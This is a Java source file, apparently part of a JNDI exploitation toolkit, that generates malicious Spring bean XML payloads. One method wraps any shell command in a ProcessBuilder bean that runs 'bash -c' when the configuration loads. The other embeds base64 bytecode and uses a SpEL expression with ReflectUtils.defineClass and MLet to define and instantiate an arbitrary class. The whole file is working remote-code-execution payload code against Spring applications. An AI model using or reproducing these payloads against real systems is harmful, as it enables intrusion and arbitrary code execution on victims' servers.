package map.jndi.payload;

import java.util.Base64;

public class SpringXmlPayload {
    public static String command(String cmd) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"" +
                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">" +
                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">" +
                "        <constructor-arg>" +
                "        <list>" +
                "            <value>bash</value>" +
                "            <value>-c</value>" +
                "            <value><![CDATA[" + cmd + "]]></value>" +
                "        </list>" +
                "        </constructor-arg>" +
                "    </bean>" +
                "</beans>";
    }

    public static String loadClass(String className, byte[] byteCode) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"" +
                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">" +
                "    <bean id=\"className\" class=\"java.lang.String\">" +
                "        <constructor-arg value=\"" + className + "\">" +
                "        </constructor-arg>" +
                "    </bean>" +
                "    <bean id=\"byteCode\" class=\"java.lang.String\">" +
                "        <constructor-arg value=\"" + Base64.getEncoder().encodeToString(byteCode) + "\">" +
                "        </constructor-arg>" +
                "    </bean>" +
                "    <bean class=\"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(className, T(org.springframework.util.Base64Utils).decodeFromString(byteCode), new javax.management.loading.MLet(new java.net.URL[0], T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}\">" +
                "    </bean>" +
                "</beans>";
    }
}
